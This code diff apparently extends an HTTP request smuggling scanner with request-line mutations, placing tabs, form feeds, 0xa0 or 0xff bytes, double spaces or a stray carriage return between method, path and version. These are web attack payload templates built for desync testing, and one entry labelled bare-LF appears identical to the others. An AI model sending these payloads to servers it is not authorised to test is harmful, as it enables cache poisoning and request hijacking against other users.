@@ -89,4 +89,29 @@ for i in range(0x7F,0x100):
 	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
 	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
 	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
+
+
+# Request-line whitespace / control-character abuse (PortSwigger
+# "request-line normalization" research). Front-ends and back-ends
+# frequently disagree on what bytes terminate the method or path.
+def render_reqline(request_line_tmpl):
+	RN = "\r\n"
+	p = Payload()
+	p.header  = request_line_tmpl + RN
+	p.header += "Transfer-Encoding: chunked" + RN
+	p.header += "Host: __HOST__" + RN
+	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36" + RN
+	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
+	p.header += "Content-Length: __REPLACE_CL__" + RN
+	return p
+
+# Single-byte separators between method/path/version
+for b in [0x09, 0x0b, 0x0c, 0xa0, 0xff]:
+	mutations["reqline-method-%02x" % b]  = render_reqline("__METHOD__%c__ENDPOINT__?cb=__RANDOM__ HTTP/1.1" % b)
+	mutations["reqline-path-%02x"   % b]  = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__%cHTTP/1.1" % b)
+	mutations["reqline-doublesep-%02x" % b] = render_reqline("__METHOD__%c%c__ENDPOINT__?cb=__RANDOM__ HTTP/1.1" % (b, b))
+
+mutations["reqline-doublespace"]    = render_reqline("__METHOD__  __ENDPOINT__?cb=__RANDOM__  HTTP/1.1")
+mutations["reqline-trail-cr"]       = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\rX: X")
+mutations["reqline-bare-lf-only"]   = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1")  # combined with bare-LF body framing
 	
